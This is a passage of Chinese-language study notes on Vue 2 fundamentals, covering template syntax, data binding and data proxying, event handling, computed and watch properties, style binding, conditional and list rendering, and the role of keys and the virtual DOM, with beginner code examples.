﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿# 1、vue基础知识和原理

## 1.1 初识Vue

* 想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象
* demo容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法
* demo容器里的代码被称为【Vue模板】
* Vue实例和容器是一一对应的
* 真实开发中只有一个Vue实例，并且会配合着组件一起使用
* {{xxx}}是Vue的语法：插值表达式，{{xxx}}可以读取到data中的所有属性
* **一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新(Vue实现的响应式)**



> 初始示例代码

```html
<!-- 准备好一个容器 -->
<div id="demo">
	<h1>Hello，{{name.toUpperCase()}}，{{address}}</h1>
</div>

<script type="text/javascript" >
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

	//创建Vue实例
	new Vue({
		el:'#demo', //el用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串。
		data:{ //data中用于存储数据，数据供el所指定的容器去使用，值我们暂时先写成一个对象。
			name:'hello,world',
			address:'北京'
		}
	});
</script>
```



## 1.2 模板语法

Vue模板语法有2大类:

* 插值语法：

  功能：用于解析标签体内容

  写法：{{xxx}}，xxx是js表达式，且可以**直接读取到vm中的所有属性**

* 指令语法:

  功能：用于解析标签（包括：标签属性、标签体内容、绑定事件.....）

  举例：v-bind:href="xxx" ，xxx同样要写js表达式，且可以直接读取到vm中的所有属性

  v-bind:可以简写为:
  



查询是不是 JS 语句 可以在浏览器控制台里面输入看看！！



> 代码

```html
<div id="root">
	<h1>插值语法</h1>
	<h3>你好，{{name}}</h3>
	<hr/>
	<h1>指令语法</h1>
    <!-- 这里是展示被Vue指令绑定的属性，引号内写的是js表达式 -->
	<a :href="school.url.toUpperCase()" x="hello">点我去{{school.name}}学习1</a>
	<a :href="school.url" x="hello">点我去{{school.name}}学习2</a>
</div>

<script>
    new Vue({
		el:'#root',
		data:{
			name:'jack',
			school:{
				name:'百度',
				url:'http://www.baidu.com',
			}
        }
	})
</script>
```





## 1.3 数据绑定

Vue中有2种数据绑定的方式：

* 单向绑定(v-bind)：数据只能从data流向页面

* 双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data

   1、双向绑定一般都应用在表单类元素上（如：input、select等）
  
   2、v-model:value 可以简写为 v-model，因为**v-model默认收集的就是value值**



> 代码

```html
<div id="root">
	<!-- 普通写法 单向数据绑定 -->
    单向数据绑定：<input type="text" v-bind:value="name"><br/>
    双向数据绑定：<input type="text" v-model:value="name"><br/>
    
    <!-- 简写 v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值-->
    单向数据绑定：<input type="text" :value="name"><br/>
    双向数据绑定：<input type="text" v-model="name"><br/>
</div>

<script>
    new Vue({
		el:'#root',
		data:{
			name:'jack',
        }
	})
</script>
```





## 1.4 el 与 data 的两种写法

el有2种写法

* new Vue时候配置el属性

* 先创建Vue实例，随后再通过vm.$mount('#root')指定el的值

> 代码

```html
<script>
   	// 第一种 
	const vm = new Vue({
		el:'#root',
		data:{
			name:'jack',
        }
	})
    
    // 第二种
    vm.$mount('#root')
</script>
```



data有2种写法

* 对象式

* 函数式

  > 在组件中，data必须使用函数式



> 代码

```html
<script>
    new Vue({
		el:'#root',
        // 第一种
		data:{
			name:'jack',
        }
        
        // 第二种
        data() {
        	return {
                name: 'jack'
            }
    	}
	})
</script>
```





## 1.5 Vue中的MVVM

* M：模型(Model) ：data中的数据
* V：视图(View) ：模板代码
* VM：视图模型(ViewModel)：Vue实例





## 1.6 数据代理

### 1.6.1 Object.defineProperty()

**首先要认识一下属性标志**：

对象属性（properties），除 **`value`** 外，还有三个特殊的特性（attributes），也就是所谓的“标志”

* **`writable`** — 如果为 `true`，则值可以被修改，否则它是只可读的
* **`enumerable`** — 如果为 `true`，则表示是可以遍历的，可以在for.. .in   Object.keys()中遍历出来
* **`configurable`** — 如果为 `true`，则此属性可以被删除，这些特性也可以被修改，否则不可以



**1、Object.getOwnPropertyDescriptor(obj, propertyName)**

这个方法是查询有关属性的完整信息 obj是对象， propertyName是属性名

```js
let user = {
  name: "John"
};

let descriptor = Object.getOwnPropertyDescriptor(user, 'name');


console.log(descriptor)

/* 属性描述符：
{
  "value": "John",
  "writable": true,
  "enumerable": true,
  "configurable": true
}
*/
```

> 打印结果

![在这里插入图片描述](https://img-blog.csdnimg.cn/09b4bf67bb7843388fecd7da1572901f.png)





**2、Object.defineProperty(obj, prop, descriptor)**

> obj：要定义属性的对象。
>
> prop：要定义或修改的属性的名称
>
> descriptor：要定义或修改的属性描述符

```js
// Object.defineproperty(对象，属性名，{配置})  设置对象新属性

let person = {
    name: 'cocoon',
}

let number = 18;

// 通过set、get 两个函数将person.age 和 number 实现双向绑定

Object.defineProperty(person, 'age', {
    // value:18, // 设置固定值

    enumerable:true, //控制属性是否可以枚举，默认值是false
    // writable:true, //控制属性是否可以被修改，默认值是false
    configurable:true, //控制属性是否可以被删除，默认值是false

    //当有人读取person的age属性时 get函数就会被调用 且返回值就是age的值
    get() {
        console.log('有人读取age属性了');
        return number;
    },

    //当修改person的age属性时 set函数就会被调用，且会收到修改的具体值
    set(value) {
        console.log('有人修改了age属性 且值是',value);
        number = value;
    }

})

```



注：

1、**存在get、set 就不要写value、writable属性**

2、**通过set、get 两个函数将person.age 和 number 实现双向绑定**





### 1.6.2 get 和 set

**访问器属性：**

本质上是用于获取和设置值的函数，但从外部代码来看就像常规属性。

访问器属性由 “getter” 和 “setter” 方法表示。在对象字面量中，它们用 `get` 和 `set` 表示：

使用一：

```js
let obj = {
    get name() {
        // 当读取 obj.propName 时，getter 起作用
    },
    set name() {
        // 当执行 obj.name = value 操作时，setter 起作用
    }
}
```



使用二：在上一节中的使用



### 1.6.3 数据代理

数据代理：通过一个对象代理对另一个对象中属性的操作（读/写)

案例：将obj.x 和 obj2.x 实现双向绑定  就是一种数据代理

```js
let obj = {
    x: 100
}

let obj2 = {
    y: 200
}

Object.defineProperty(obj2, 'x', {
    get() {
        return obj.x;
    },
    set(value) {
        obj.x = value;
    }
})
```



**接下来介绍Vue中的数据代理**

1、概念

* Vue中的数据代理：通过vm对象来代理data对象中属性的操作（读/写）
* Vue中数据代理的好处：更加方便的操作data中的数据
* 基本原理：
  * 通过Object.defineProperty()把data对象中所有属性添加到vm上。
  * 为每一个添加到vm上的属性，都指定一个getter/setter。
  * 在getter/setter内部去操作（读/写）data中对应的属性。



```js
const vm = new Vue({
    el:'#root',
    data:{
        name:'尚硅谷',
        address:'宏福科技园'
    }
})
```

个人理解：把vm._data（就是配置里的data）的所有属性 通过数据代理 绑定到vm里面  方便直接用就不用加

`_data` 了



2、作用


> 数据代理有啥意义？明明通过 vm._data.name 也可以访问 name 的值，为啥费力去这样操作？

在插值语法中，{{ name }} 取到的值就相当于 {{ vm.name }}，不用数据代理的话，在插值语法就要这样去写了：{{ _data. name }}  写起来会麻烦一点



3、图解

![在这里插入图片描述](https://img-blog.csdnimg.cn/8ccad88c5e40497587dadb3db07e1821.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)






## 1.7 事件处理



### 1.7.1 事件的基本使用

* 使用 `v-on:xxx` 或 `@xxx` 绑定事件，其中 xxx 一般指原生事件

* `v-on:` 可简写为 `@` 

* 事件的回调需要配置在 methods 对象中

* methods 中配置的函数，都是被 Vue 所管理的函数，this 的指向是 vm 或 组件实例对象

  


### 1.7.2 常见的监听事件
1、常见的鼠标事件监听

| 事件名          | 事件描述                           |
| --------------- | ---------------------------------- |
| `onclick`       | 当鼠标单击某个对象                 |
| `ondblclick`    | 当鼠标双击某个对象                 |
| `onmousedown`   | 当某个鼠标按键在某个对象上被按下   |
| `onmouseup`     | 当某个鼠标按键在某个对象上被松开   |
| `onmousemove`   | 当某个鼠标按键在某个对象上被移动   |
| `onmouseenter`  | 当鼠标进入某个对象  只针对自身盒子 |
| `onmouseleave`  | 当鼠标离开某个对象  只针对自身盒子 |
| `onfocus`       | 当鼠标聚焦到input上                |
| `onblur`        | 当鼠标脱离input                    |
| `oncontextmenu` | 右键显示菜单                       |
| `onselectstart` | 鼠标滑动选中                       |
| `onmouseover`   | 当鼠标进入某个对象  子盒子生效     |
| `onmouseout`    | 当鼠标离开某个对象  子盒子生效     |

2、常见的键盘事件监听

| 事件名       |                           事件描述                           |
| ------------ | :----------------------------------------------------------: |
| `onkeypress` | 当某个键盘的键被按下（系统按钮如箭头键和功能键无法得到识别） |
| `onkeydown`  | 当某个键盘的键被按下（系统按钮可以识别，并且会先于 `onkeypress` 发生） |
| `onkeyup`    |                     当某个键盘的键被松开                     |

3、常见的表单事件监听

| 事件名     | 事件描述                                  |
| ---------- | ----------------------------------------- |
| `onchange` | 当用户改变完成域的内容                    |
| `onfocus`  | 当某元素获得焦点（比如 tab 键或鼠标点击） |
| `onblur`   | 当某元素失去焦点                          |
| `onsubmit` | 当表单被提交                              |
| `onreset`  | 当表单被重置                              |
| `oninput`  | 当用户输入时触发（作用于表单时）          |



### 1.7.2 事件的修饰符

* prevent：阻止默认事件（常用）
* stop：阻止事件冒泡（常用）
* once：事件只触发一次（常用）
* self：只监听触发该元素的事件



```html
<!-- 准备好一个容器-->
<div id="root">
    <h2>欢迎来到{{name}}学习</h2>
    <!-- 阻止默认事件（常用） -->
	<a href="http://www.baidu.com" @click.prevent="showInfo">点我提示信息</a>
    <!-- 阻止事件冒泡（常用） -->
    <div class="demo1" @click="showInfo">
        <button @click.stop="showInfo">点我提示信息</button>
        <!-- 修饰符可以连续写 -->
        <!-- <a href="http://www.atguigu.com" @click.prevent.stop="showInfo">点我提示信息</a> -->
    </div>
    <!-- 事件只触发一次（常用） -->
    <button @click.once="showInfo">点我提示信息</button>
</div>

```



### 1.7.3 事件的传参

事件绑定的函数可以传参：参数 $event 则 e.target 为当前 DOM 对象！！！

**如果传参里面不写 $event ，函数里面照样可以用 e 作为参数**

```
@blur="handleBlur(todo,$event)"
```

```js
handleBlur(todo,e) {
    if(e.target.value.trim() == '') return alert('输入不能为空！');

    todo.isEdit = false;
}
```





## 1.8 键盘事件

键盘事件语法糖：@keydown，@keyup

Vue中常用的按键别名：

* 回车 => enter
* 删除 => delete
* 退出 => esc
* 空格 => space
* 换行 => tab (特殊，必须配合keydown去使用)

其他按键名为 e.key

@keydowm.enter="show"：当按下enter时触发show函数



```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>

    <script src="../js/vue.js"></script>
</head>
<body>
    <div class="root">
        <input type="text" @keyup="show">
        <input type="text" @keydown.enter="showValue">
        <input type="text" @keydown.q="showValue">
    </div>

    <script>
        // 键盘事件一般搭配input使用

        // @keydowm.enter="show"：当按下enter时触发show函数

        // @keydowm.(e.key) ="show"：当按下按键（e.key）时触发
        

        new Vue({
            el: '.root',

            methods: {
                show(e) {
                    console.log(e.key);
                    console.log(e.code);

                },

                showValue(e) {
                    console.log(e.target.value);
                }

            }
        })
    </script>
</body>
</html>
```





## 1.9 计算属性 computed

* 定义：**要用的属性不存在，要通过已有属性计算得来**
* 原理：底层借助了Objcet.defineProperty方法提供的getter和setter
* get 函数什么时候执行？
  * (1).**初次读取时会执行一次**
  * (2).**当依赖的数据发生改变时会被再次调用**
* set 函数什么时候执行？
  * (1).当手动修改了计算属性时
  * (2).**我们一般在 set 函数中利用 value 修改 计算属性 所依赖的数据，从而修改该计算属性！！**
* 优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便
* 备注：
  * 计算属性最终会出现在vm上，直接读取使用即可
  * 如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变



- 计算属性完整版写法

```html
<body>
    <div class="root">
        <input type="text" v-model="firstname">
        <input type="text" v-model="lastname">
        <div>{{fullname}}</div>
    </div>

    <script>
        const vm = new Vue({
            el: '.root',
            data: {
                firstname: '张',
                lastname: '三'
            },

            computed: {
                fullname: {
                    // fullname读取时执行  return为fullname的值  this执行vm
                    get() {
                        return this.firstname + '-' + this.lastname;
                    },

                    // fullname被外界修改时执行  value为修改的值  应同步修改依赖变量
                    set(value) {
                        let arr = value.split('-');
                        
                        // 同步修改依赖变量
                        this.firstname = arr[0];
                        this.lastname = arr[1];   
                    }

                }
            }
        })
    </script>
</body>
```




- 计算属性简写（计算属性只读时）

```html
<!-- 准备好一个容器-->
<div id="root">
    姓：<input type="text" v-model="firstName">
    名：<input type="text" v-model="lastName"> 
    全名：<span>{{fullName}}</span>
</div>

<script>
	const vm = new Vue({
        el:'#root',
        data:{
            firstName:'张',
            lastName:'三',
        }
        computed:{
            fullName() {
        		console.log('get被调用了')
				return this.firstName + '-' + this.lastName
    		}
        }
    })
</script>
```





## 1.10 监视属性 watch

监视属性watch：

- 可以监视组件中所有的属性！！

* 当被监视的属性变化时, 回调函数自动调用, 进行相关操作
* 监视的属性必须存在，才能进行监视
* 监视的两种写法：
  * (1).new Vue时传入watch配置
  * (2).通过vm.$watch监视



### 1.10.1 普通监视

```js
// 添加监视属性
watch: {
    ishot: {
        // 属性修改时执行
        handler(newValue,oldValue) {
          console.log(newValue,oldValue);  
        },

        immediate: true // 立即执行handler
    }
}
```

全局

```js
vm.$watch('ishot',{

    // 属性修改时执行
    handler(newValue,oldValue) {
        console.log(newValue,oldValue);  
    },

    immediate: true // 立即执行handler

})
```




### 1.10.2 深度监视

* Vue 中的 watch 默认不监测对象内部值的改变（一层）
* 配置 `deep:true` 可以监测对象内部值改变（多层）



```html
<body>
    <div class="number">
        <div>a: {{number.a}}  b: {{number.b}}</div>
        <button @click="number.a++">a+1</button>
        <button @click="number.b++">b+1</button>
    </div>

    <script>
        new Vue({
            el: '.number',

            data: {
                number: {
                    a: 0,
                    b: 0
                }
            },

            watch: {
                // 监视number和其内部属性
                number: {
                    deep: true, // 开启深度监视
                    handler(newValue,oldValue) {
                        console.log('number发生了改变');
                        console.log(newValue,oldValue);  // 两个是一样的？？！
                    }
                },

                // 监视单个属性
                'number.a': {
                    handler(newValue,oldValue) {
                        console.log('a发生了改变');
                        console.log(newValue,oldValue);
                    }
                }
            }
        })
    </script>
</body>
```





### 1.10.3 监视属性简写

当只有handler时就可以简写

```js
watch: {
    // 监视number和其内部属性
    number: {
        // deep: true, // 开启深度监视
        handler(newValue,oldValue) {
            console.log('number发生了改变');
            console.log(newValue,oldValue);
        }
    },

    // 当只有handler时就可以简写
    'number.b'(newValue,oldValue) {
        console.log('b发生了改变');
        console.log(newValue,oldValue);
    }
}

vm.$watch('number.b',function(newValue,oldValue) {
     console.log('b发生了改变');
     console.log(newValue,oldValue);   
})
```



**computed和watch之间的区别：**

1、computed能完成的功能，watch都可以完成     **但是computed更方便**

2、当需要异步操作时（定时器，promise）,用watch

3、所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，**这样this的指向才是vm** 或 组件实例对象，否则的话this指向window



```html
<!-- 准备好一个容器-->
<div id="root">
    姓：<input type="text" v-model="firstName"> <br/><br/>
    名：<input type="text" v-model="lastName"> <br/><br/>
    全名：<span>{{fullName}}</span> <br/><br/>
</div>

<script>
	const vm = new Vue({
        el:'#root',
        data:{
            firstName:'张',
            lastName:'三',
            fullName:'张-三'
        },
        watch:{
            // watch 监视器里可以写 异步函数
            firstName(val){
                setTimeout(()=>{
                    console.log(this) // this指向window
                    this.fullName = val + '-' + this.lastName
                },1000);
            },
            
            lastName(val){
                this.fullName = this.firstName + '-' + val
            }
        }
    })
</script>
```





## 1.11 绑定样式+动画

高级一点的玩法：动态添加类名或样式

```vue
<h1 :style="{display: currentIndex == index ? 'block' : 'none'}"/>

<h1 :class="{color: currentIndex == index}"/>
```





### 1.11.1  class样式

写法：:class="xxx"    xxx可以是字符串、对象、数组。

所以分为三种写法，字符串写法，数组写法，对象写法	

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>

    <script src="../js/vue.js"></script>

    <style>
        .basic {
            width: 100px;
            height: 100px;
            background-color: black;
        }

        .red {
            background-color: red;
        }

        .height {
            height: 200px;
        }

        .width {
            width: 200px;
        }
    </style>
</head>
<body>
    <div class="root">
        <!-- 直接用字符串 -->
        <div class="basic" :class="mood"></div>
        <button @click="changeColor">改变颜色</button>

        <!-- 用一个数组包含类名 -->
        <div class="basic" :class="classArr"></div>
        <button @click="delRed">去掉红色</button>

        <!-- 用一个对象给类名加开关 -->
        <div class="basic" :class="classObj"></div>
        <button @click="delRed2">去掉红色</button>

    </div>

    <script>

        Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

        new Vue({
            el: '.root',
            data: {
                // 动态class
                mood: '',

                classArr: ['red','height','width'],

                classObj: {
                    'red': true,
                    'height': true,
                    'width': true 
                }
            },

            methods: {
                changeColor() {
                    this.mood = 'red';
                },

                delRed() {
                    this.classArr.shift();
                },

                delRed2() {
                    this.classObj.red = false;
                }
            },
        })
    </script>
</body>
</html>
```





### 1.11.2 style样式

有两种写法，对象写法，数组写法

**对象写法**

```html
<!-- 准备好一个容器-->
<div id="root">
    <!-- 绑定style样式--对象写法 -->
	<div class="basic" :style="styleObj">{{name}}</div>
</div>

<script>
	const vm = new Vue({
        el:'#root',
        data:{
            font: 40,
            styleObj:{
                fontSize: this.font + 'px',
                color:'red',
			}
        }
    })
</script>
```



**数组写法**

```html
<!-- 准备好一个容器-->
<div id="root">
    <!-- 绑定style样式--数组写法 -->
	<div class="basic" :style="styleArr">{{name}}</div>
</div>

<script>
	const vm = new Vue({
        el:'#root',
        data:{
            styleArr:[
                {
                    fontSize: '40px',
                    color:'blue',
                },
                {
                    backgroundColor:'gray'
                }
            ]
        }
    })
</script>
```



### 1.11.3 搭配animate.css

实现动画效果，可以使用一个库：`Animate.css`    官网：https://animate.style/（可能进不去）

github：https://github.com/animate-css/animate.css

动画演示网址：https://www.dowebok.com/demo/2014/98/



1、安装：

```
npm i animate.css
```

```js
// 在 mian.js 全局安装
import animated  from 'animate.css'
Vue.use(animated)
```



2、当类名为`animate__animated + animate__动画名字` 时，就会展示动画



**简单class绑定：**`    <h1 class="animate__animated animate__bounceInDown">hello!</h1>`



**动态class绑定**

1、class绑定

```vue
<button 
    class="btn btn-danger animate__animated"
    :class="delClass" 
    @click="handleDelete()"
>删除</button>
```

```js
delClass: {
    'animate__rubberBand': false
}
```



2、当被点击时就展示动画

```js
handleDelete() {
    this.delClass.animate__rubberBand = true;
    setTimeout(()=> {
        this.delClass.animate__rubberBand = false;
    },500)
},

// 定时器里面的时间最小为动画时间！！！！
```





## 1.12 条件渲染

### 1.12.1 v-if

* 写法：

  (1).v-if="表达式" 

  (2).v-else-if="表达式"

  (3).v-else="表达式"

* 适用于：切换频率较低的场景

* 特点：**不展示的DOM元素直接被移除**

* 注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”



```html
<!-- 准备好一个容器-->
<div id="root">
    <!-- 使用v-if做条件渲染 -->
    <h2 v-if="false">欢迎来到{{name}}</h2>
    <h2 v-if="1 === 1">欢迎来到{{name}}</h2>
    
    
    <!-- v-else和v-else-if -->
    <div v-if="n === 1">Angular</div>
    <div v-else-if="n === 2">React</div>
    <div v-else-if="n === 3">Vue</div>
    <div v-else>哈哈</div>
    
    
    <!-- v-if与template的配合使用 -->
    <!-- 就不需要写好多个判断，写一个就行 -->
    <!-- 这里的思想就像事件代理的使用 -->
    <template v-if="n === 1">
        <h2>你好</h2>
        <h2>尚硅谷</h2>
        <h2>北京</h2>
    </template>
</div>

<script>
	const vm = new Vue({
        el:'#root',
        data:{
            styleArr:[
                {
                    fontSize: '40px',
                    color:'blue',
                },
                {
                    backgroundColor:'gray'
                }
            ]
        }
    })
</script>
```



### **1.12.2 v-show**

* 写法：v-show="表达式"
* 适用于：切换频率较高的场景
* 特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉(display:none)



> 备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到
>
> v-if 是实打实地改变dom元素，v-show 是隐藏或显示dom元素

```html
<!-- 准备好一个容器-->
<div id="root">
    <!-- 使用v-show做条件渲染 -->
    <h2 v-show="false">欢迎来到{{name}}</h2>
    <h2 v-show="1 === 1">欢迎来到{{name}}</h2>
</div>
```





## 1.13 列表渲染

### 1.13.1 v-for

* 用于展示列表数据
* 语法：`v-for="(item, index) in xxx" :key="yyy"`
* 可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）



```html
<div id="root">
    <!-- 遍历数组 -->
    <h2>人员列表（遍历数组）</h2>
    <ul>
        <li v-for="(p,index) of persons" :key="index">
            {{p.name}}-{{p.age}}
        </li>
    </ul>

    <!-- 遍历对象 -->
    <h2>汽车信息（遍历对象）</h2>
    <ul>
        <li v-for="(value,k) of car" :key="k">
            {{k}}-{{value}}
        </li>
    </ul>

    <!-- 遍历字符串 -->
    <h2>测试遍历字符串（用得少）</h2>
    <ul>
        <li v-for="(char,index) of str" :key="index">
            {{char}}-{{index}}
        </li>
    </ul>

    <!-- 遍历指定次数 -->
    <h2>测试遍历指定次数（用得少）</h2>
    <ul>
        <li v-for="(number,index) of 5" :key="index">
            {{index}}-{{number}}
        </li>
    </ul>
</div>

<script>
	const vm = new Vue({
        el:'#root',
        data: {
			persons: [
				{ id: '001', name: '张三', age: 18 },
				{ id: '002', name: '李四', age: 19 },
				{ id: '003', name: '王五', age: 20 }
			],
			car: {
				name: '奥迪A8',
				price: '70万',
				color: '黑色'
			},
			str: 'hello'
		}
    })
</script>
```



### 1.13.2 key的使用

key作为vue工作的唯一标识，如果没写则默认为index。**这样的话遍历数组的内部顺序就不能改**

1、如果用默认的就不要去改数组的顺序

2、或者自己设定唯一标识

可以用一个第三方库：`nanoid` nodo.js里面有



- 不写key   默认:key="index"

```html
<body>
    <div class="root">
        <ul>
            <!-- 不写key默认 :key="index" -->
            <li v-for="(item,index) of persons">
                姓名: {{item.name}}  年龄: {{item.age}}
                <input type="text">
            </li>

            <button @click="add">点击添加</button>
        </ul>
    </div>

    <script>
        Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

        new Vue({
            el: '.root',
            
            data: {
                persons: [
                    {id: '001', name: 'cocoon', age: '18'},
                    {id: '002', name: 'czy', age: '20'},
                    {id: '003', name: 'cxx', age: '22'},
                ]
            },

            methods: {
              add() {
                // 往头部插入 则破坏了初始顺序
                this.persons.unshift({id: '004', name: 'wassa', age: '10'})
              }  
            },
        })
    </script>
</body>
```

<img src="C:\Users\LENOVO\AppData\Roaming\Typora\typora-user-images\image-20221226150438419.png" alt="image-20221226150438419" style="zoom:50%;" />

<img src="C:\Users\LENOVO\AppData\Roaming\Typora\typora-user-images\image-20221226150456842.png" alt="image-20221226150456842" style="zoom:50%;" />



- 将key改成`:key="item.id"`

```html
<li v-for="(item,index) of persons" :key="item.id">
    姓名: {{item.name}}  年龄: {{item.age}}
    <input type="text">
</li>
```

<img src="C:\Users\LENOVO\AppData\Roaming\Typora\typora-user-images\image-20221226150746304.png" alt="image-20221226150746304" style="zoom:50%;" />



### **1.13.3 key的原理**

vue中的key有什么作用？（key的内部原理）

了解vue中key的原理需要一些前置知识。

就是vue的虚拟dom，vue会根据 data中的数据生成虚拟dom，如果是第一次生成页面，就将虚拟dom转成真实dom，在页面展示出来。

虚拟dom有啥用？每次vm._data 中的数据更改，都会触发生成新的虚拟dom，新的虚拟dom会跟旧的虚拟dom进行比较，如果有相同的，在生成真实dom时，这部分相同的就不需要重新生成，只需要将两者之间不同的dom转换成真实dom，再与原来的真实dom进行拼接。我的理解是虚拟dom就是起到了一个dom复用的作用，还有避免重复多余的操作，下文有详细解释。



而key有啥用？

key是虚拟dom的标识。

先来点预备的知识：啥是真实 DOM？真实 DOM 和 虚拟 DOM 有啥区别？如何用代码展现真实 DOM 和 虚拟 DOM



#### 1.13.3.1 真实`DOM`和其解析流程

`webkit` 渲染引擎工作流程图

![img](https://img-blog.csdnimg.cn/img_convert/b32d88931ee775d57b382d7585de3ad8.png)

> 中文版

![img](https://img-blog.csdnimg.cn/img_convert/cd1757feee540ef20c50b81af16d75ca.png)



 所有的浏览器渲染引擎工作流程大致分为5步：创建 `DOM` 树 —> 创建 `Style Rules` -> 构建 `Render` 树 —> 布局 `Layout` -—> 绘制 `Painting`。

* 第一步，构建 DOM 树：当浏览器接收到来自服务器响应的HTML文档后，会遍历文档节点，生成DOM树。需要注意的是在DOM树生成的过程中有可能会被CSS和JS的加载执行阻塞，渲染阻塞下面会讲到。

* 第二步，生成样式表：用 CSS 分析器，分析 CSS 文件和元素上的 inline 样式，生成页面的样式表；

* 渲染阻塞：当浏览器遇到一个script标签时，DOM构建将暂停，直到脚本加载执行，然后继续构建DOM树。每次去执行Javascript脚本都会严重阻塞DOM树构建，如果JavaScript脚本还操作了CSSOM，而正好这个CSSOM没有下载和构建，那么浏览器甚至会延迟脚本执行和构建DOM，直到这个CSSOM的下载和构建。所以，script标签引入很重要，实际使用时可以遵循下面两个原则：

  * css优先：引入顺序上，css资源先于js资源

  * js后置：js代码放在底部，且js应尽量少影响DOM构建

    > 还有一个小知识：当解析html时，会把新来的元素插入dom树里，同时去查找css，然后把对应的样式规则应用到元素上，查找样式表是按照从右到左的顺序匹配的例如：div p {...}，会先寻找所有p标签并判断它的父标签是否为div之后才决定要不要采用这个样式渲染。所以平时写css尽量用class或者id，不要过度层叠

* 第三步，构建渲染树：通过DOM树和CSS规则我们可以构建渲染树。浏览器会从DOM树根节点开始遍历每个可见节点(注意是可见节点)对每个可见节点，找到其适配的CSS规则并应用。渲染树构建完后，每个节点都是可见节点并且都含有其内容和对应的规则的样式。这也是渲染树和DOM树最大的区别所在。渲染是用于显示，那些不可见的元素就不会在这棵树出现了。除此以外，display none的元素也不会被显示在这棵树里。visibility hidden的元素会出现在这棵树里。

* 第四步，**渲染布局**：布局阶段会从渲染树的根节点开始遍历，然后确定每个节点对象在页面上的确切大小与位置，布局阶段的输出是一个盒子模型，它会精确地捕获每个元素在屏幕内的确切位置与大小。

* 第五步，**渲染树绘制**：在绘制阶段，遍历渲染树，调用渲染器的paint()方法在屏幕上显示其内容。渲染树的绘制工作是由浏览器的UI后端组件完成的。

**注意点：**

**1、`DOM` 树的构建是文档加载完成开始的？** 构建 `DOM` 树是一个渐进过程，为达到更好的用户体验，渲染引擎会尽快将内容显示在屏幕上，它不必等到整个 `HTML` 文档解析完成之后才开始构建 `render` 树和布局。

**2、`Render` 树是 `DOM` 树和 `CSS` 样式表构建完毕后才开始构建的？** 这三个过程在实际进行的时候并不是完全独立的，而是会有交叉，会一边加载，一边解析，以及一边渲染。

**3、`CSS` 的解析注意点？** `CSS` 的解析是从右往左逆向解析的，嵌套标签越多，解析越慢。

**4、`JS` 操作真实 `DOM` 的代价？**传统DOM结构操作方式对性能的影响很大，原因是频繁操作DOM结构操作会引起页面的重排(reflow)和重绘(repaint)，浏览器不得不频繁地计算布局，重新排列和绘制页面元素，导致浏览器产生巨大的性能开销。直接操作真实`DOM`的性能特别差，我们可以来演示一遍。

```js
<div id="app"></div>
<script>
    // 获取 DIV 元素
    let box = document.querySelector('#app');
    console.log(box);

    // 真实 DOM 操作
    console.time('a');
    for (let i = 0; i <= 10000; i++) {
        box.innerHTML = i;
    }
    console.timeEnd('a');

    // 虚拟 DOM 操作
    let num = 0;
    console.time('b');
    for (let i = 0; i <= 10000; i++) {
        num = i;
    }
    box.innerHTML = num;
    console.timeEnd('b');

</script>
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/0740cb16f1354358bed6ef638b90ebfe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_19,color_FFFFFF,t_70,g_se,x_16)


>从结果中可以看出，操作真实 DOM 的性能是非常差的，所以我们要尽可能的复用，减少 DOM 操作。





#### **1.13.3.2 虚拟 DOM 的好处**

​	虚拟 `DOM` 就是为了解决浏览器性能问题而被设计出来的。如前，若一次操作中有 10 次更新 `DOM` 的动作，虚拟 `DOM` 不会立即操作 `DOM`，而是将这 10 次更新的 `diff` 内容保存到本地一个 `JS` 对象中，最终将这个 `JS` 对象一次性 `attch` 到 `DOM` 树上，再进行后续操作，避免大量无谓的计算量。所以，用 `JS` 对象模拟 `DOM` 节点的好处是，页面的更新可以先全部反映在 `JS` 对象(虚拟 `DOM` )上，操作内存中的 `JS` 对象的速度显然要更快，等更新完成后，再将最终的 `JS` 对象映射成真实的 `DOM`，交由浏览器去绘制。

​	虽然这一个虚拟 DOM 带来的一个优势，但并不是全部。虚拟 DOM 最大的优势在于抽象了原本的渲染过程，实现了跨平台的能力，而不仅仅局限于浏览器的 DOM，可以是安卓和 IOS 的原生组件，可以是近期很火热的小程序，也可以是各种GUI。

​	回到最开始的问题，虚拟 DOM 到底是什么，说简单点，就是一个普通的 JavaScript 对象，包含了 `tag`、`props`、`children` 三个属性。

> 接下来我们手动实现下 虚拟 DOM。
>
> 分两种实现方式：
>
> 一种原生 js DOM 操作实现；
>
> 另一种主流虚拟 DOM 库（snabbdom、virtual-dom）的实现（用h函数渲染）（暂时还不理解）



**算法实现**

**（1）**用 JS 对象模拟 DOM 树：

```html
<div id="virtual-dom">
    <p>Virtual DOM</p>
    <ul id="list">
      <li class="item">Item 1</li>
